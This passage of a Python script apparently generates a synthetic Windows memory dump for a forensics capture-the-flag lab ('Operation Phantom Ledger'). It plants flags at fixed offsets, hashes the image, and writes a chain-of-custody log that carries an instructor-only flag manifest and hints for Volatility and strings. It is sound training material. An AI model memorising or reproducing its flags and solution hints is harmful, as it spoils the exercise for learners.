    blob += b'CASE: OPL-2024-007 | SUSPECT: ROHAN MEHTA\n'
    blob += b'=' * 60 + b'\n'
    blob += b'FIRST_RESPONDER_NOTE: Evidence acquired at 14:42:07 UTC\n'
    blob += flags['flag_01_strings'].encode() + b'\n'
    blob += b'=' * 60 + b'\n'
    return bytes(blob)


# ═════════════════════════════════════════════════════════════════
# FILLER - pseudo-random bytes to simulate real heap/stack noise
# ═════════════════════════════════════════════════════════════════

def fill_noise(size, seed=42):
    """Deterministic pseudo-random noise (reproducible dumps)."""
    rng = random.Random(seed)
    chunk = 65536
    out = bytearray()
    while len(out) < size:
        seg = min(chunk, size - len(out))
        out += bytes([rng.randint(0, 255) for _ in range(seg)])
    return bytes(out[:size])


# ═════════════════════════════════════════════════════════════════
# MAIN ASSEMBLER
# ═════════════════════════════════════════════════════════════════

def assemble_dump(flags, size_mb):
    total_size = size_mb * 1024 * 1024
    image = bytearray(fill_noise(total_size, seed=0xDEADBEEF))

    def write_at(offset, data):
        if offset + len(data) > total_size:
            print(f'  [!] WARN: artifact at 0x{offset:X} truncated (size={len(data)})')
            data = data[:total_size - offset]
        image[offset:offset + len(data)] = data

    print('[*] Assembling memory image...')

    artifacts = [
        ('boot_sector',        build_boot_sector()),
        ('kdbg_block',         build_kdbg_block()),
        ('eprocess_list',      build_eprocess_list(flags)),
        ('lsass_region',       build_lsass_region(flags)),
        ('network_table',      build_network_table(flags)),
        ('registry_hive',      build_registry_hive(flags)),
        ('powershell_history', build_powershell_history(flags)),
        ('browser_history',    build_browser_history()),
        ('clipboard',          build_clipboard(flags)),
        ('transaction_log',    build_transaction_log(flags)),
        ('filesystem_paths',   build_strings_haystack(flags)),
        ('unicode_blob',       build_unicode_blob(flags)),
        ('malfind_region',     build_malfind_region()),
        ('flag_plain',         build_flag_plain(flags)),
    ]

    for name, data in artifacts:
        offset = OFFSETS[name]
        write_at(offset, data)
        print(f'  [+] {name:<22} @ 0x{offset:08X}  ({len(data):>6} bytes)')

    return bytes(image)


def hash_image(data):
    sha256 = hashlib.sha256(data).hexdigest()
    md5    = hashlib.md5(data).hexdigest()
    return sha256, md5


def write_coc(output_path, sha256, md5, size_mb, flags):
    """Write chain-of-custody log alongside the image."""
    coc_path = output_path.replace('.raw', '.coc.txt')
    ts = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
    lines = [
        '=' * 65,
        'CHAIN OF CUSTODY - RAM EVIDENCE',
        '=' * 65,
        f'Case ID       : {CASE_ID}',
        f'Suspect       : {SUSPECT}',
        f'Computer      : {COMPUTER_NAME}',
        f'Image File    : {os.path.basename(output_path)}',
        f'Image Size    : {size_mb} MB ({size_mb * 1024 * 1024} bytes)',
        f'Acquired By   : HeXx | Cywarx',
        f'Acquisition   : {ts}',
        f'Tool          : make_ramdump.py v1.0 (synthetic)',
        '',
        'INTEGRITY HASHES:',
        f'  SHA256: {sha256}',
        f'  MD5   : {md5}',
        '',
        'FLAG MANIFEST (for instructor only):',
    ]
    for k, v in flags.items():
        lines.append(f'  {k:<26}: {v}')
    lines += [
        '',
        'ANALYSIS GUIDANCE:',
        '  strings -n 8 <image>          # ASCII artifacts',
        '  strings -n 8 -e l <image>     # Unicode artifacts',
        '  python3 vol.py -f <image> windows.info',
        '  python3 vol.py -f <image> windows.pslist',
        '  python3 vol.py -f <image> windows.cmdline',
        '  python3 vol.py -f <image> windows.netscan',
        '  python3 vol.py -f <image> windows.registry.hivelist',
        '  python3 vol.py -f <image> windows.clipboard',
        '  bulk_extractor -o out/ <image>',
        '=' * 65,
    ]
    with open(coc_path, 'w') as f:
        f.write('\n'.join(lines) + '\n')
    return coc_path


# ═════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description='Cywarx Unit IV - Synthetic Windows RAM Dump Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
            Examples:
              python3 make_ramdump.py
              python3 make_ramdump.py --output /evidence/phantom_ledger.raw --size 128
              python3 make_ramdump.py --flags my_flags.json
        ''')
    )
    parser.add_argument('--output', default='phantom_ledger.raw',
                        help='Output .raw file path (default: phantom_ledger.raw)')
    parser.add_argument('--size', type=int, default=DUMP_SIZE_MB,
                        help=f'Image size in MB (default: {DUMP_SIZE_MB})')
    parser.add_argument('--flags', default=None,
                        help='JSON file with custom flag values (optional)')
    args = parser.parse_args()

    # Load flags
    flags = DEFAULT_FLAGS.copy()
    if args.flags:
        with open(args.flags) as f:
            custom = json.load(f)
        flags.update(custom)
        print(f'[*] Loaded custom flags from: {args.flags}')

    print(f'''
╔══════════════════════════════════════════════════════════════════╗
║  Cywarx Unit IV - RAM Dump Generator                             ║
║  Operation Phantom Ledger | Suspect: Rohan Mehta                 ║
╚══════════════════════════════════════════════════════════════════╝
[*] Output  : {args.output}
[*] Size    : {args.size} MB
[*] Flags   : {len(flags)} embedded
''')

    print('[*] Building artifact blobs...')
    image = assemble_dump(flags, args.size)

    print(f'\n[*] Writing {args.size} MB image -> {args.output}')
    with open(args.output, 'wb') as f:
        f.write(image)

    print('[*] Computing integrity hashes...')
    sha256, md5 = hash_image(image)
    print(f'    SHA256 : {sha256}')
    print(f'    MD5    : {md5}')

    # Write hash file
    hash_file = args.output + '.sha256'
    with open(hash_file, 'w') as f:
        f.write(f'{sha256}  {os.path.basename(args.output)}\n')
        f.write(f'{md5}  {os.path.basename(args.output)}\n')
    print(f'[*] Hash file    : {hash_file}')

    coc_path = write_coc(args.output, sha256, md5, args.size, flags)
    print(f'[*] CoC log      : {coc_path}')

    print(f'''
╔══════════════════════════════════════════════════════════════════╗
║  DONE - Evidence image ready for CTF lab                         ║
╠══════════════════════════════════════════════════════════════════╣
║  Quick verification:                                             ║
║    sha256sum -c {os.path.basename(hash_file):<43}║
║  First flag (easy win):                                          ║
║    strings -n 8 {os.path.basename(args.output):<40} ║
║    | grep Cywarx{{                                               ║
╚══════════════════════════════════════════════════════════════════╝
''')


if __name__ == '__main__':
    main()
